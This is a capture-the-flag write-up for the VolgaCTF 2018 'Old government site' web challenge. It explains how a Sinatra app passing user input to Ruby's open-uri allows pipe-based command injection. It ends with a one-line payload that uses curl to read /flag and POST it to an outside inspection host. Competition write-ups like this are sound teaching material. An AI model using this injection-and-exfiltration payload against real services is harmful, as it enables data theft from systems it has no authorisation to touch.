# VolgaCTF Quals 2018 : Old government site

**Team:** NOPS  
**Category:** Web  
**Points:** 150  
**Description:**  
It's an old government web-site. Please, don't touch it. It works properly.

## Write-up

After connecting to the website, you have access to some links, no forms.
Nevertheless we saw that pages are fetched with an id: `http://old-government-
site.quals.2018.volgactf.ru:8080/page?id=33`

We run a script to see if there were some hidden pages and found one with the
id: `id=18`

It asks us to enter a website.  
If you enter a correct website like http://google.com you have a string
showing `validated` whereas is you only put google.com, it shows `error`.

When you enter a correct website, the server does a GET request on it.

So we played a bit with this field and found out that `/etc` is a correct
website. We then tried with the linux filesystem `/var` and some linux
commands `/bin/ls` etc and finally, we tried `/flag`. It worked. Nice, maybe
it's where the flag is, but how can we access it ?

Up to now, we know that the script behind is executing the command we give or
send a GET request on the url.

We also know that the framework used for the website is Sinatra. if you
request an unknow web page, it gives you an error.  
Sinatra is in ruby.

So we have to find a function in ruby that could open a file or a URL.

We found open-uri and the vulnerabilities related to it:
[sakurity.com](https://sakurity.com/blog/2015/02/28/openuri.html)

Let's try a `| ls` : it's validated. We've got a command injection. Let's
craft our command so it can read the /flag file and send it to a server:
`|curl -d "$(cat /flag)" -X POST http://ptsv2.com/t/3awt7-1521988385/post` (we
use ptsv2 website to inspect the content of the HTTP requests)

Bingo ! We've got out flag !

Original writeup
(https://github.com/newclem/ctfs/blob/master/2018/VolgaCTF_quals/old_government_site.md).